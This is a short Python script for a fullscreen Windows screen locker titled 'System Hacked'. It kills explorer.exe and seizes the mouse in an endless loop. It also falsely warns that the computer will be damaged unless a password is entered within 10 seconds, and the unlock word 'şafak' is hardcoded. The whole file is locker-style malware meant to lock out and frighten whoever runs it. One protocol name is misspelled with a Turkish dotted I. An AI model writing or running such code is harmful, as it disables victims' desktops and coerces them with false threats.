from tkinter.font import Font
import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep
import os
import time


window = Tk()
pyautogui.FAILSAFE = False

width = window.winfo_screenwidth()
height = window.winfo_screenheight()

window.title("System Hacked")

window.attributes("-fullscreen",True)

entry = Entry(window, font = 1)
entry.place(width = 150, height=50, x = width/2-75,y=height/2-25)

label0 = Label(window,text="System has been locked,Enter the password and press ctrl c", font=10)
label0.grid(row = 0, column = 0)
label1 = Label(window, text="If you do not enter the password within 10 seconds, your computer will be damaged. ", font ="Arial 20")

label1.place(x=width/2-75-200, y=height/2-25-150)
os.system("taskkill /f /IM explorer.exe")


window.update()
sleep(0.2)

click(width/2, height/2)

def callback(event):
    global k, entry
    if entry.get()=="şafak":
        k = True
        os.system("start explorer.exe")

def on_closing():
    click(width/2, height/2)
    moveTo(width/2,height/2)

    window.attributes("-fullscreen", True)

    window.protocol("WM_DELETE_WİNDOW", on_closing)
    window.update()

    window.bind("<Control-KeyPress-c>",callback)


k = False 

while not k:
    on_closing()

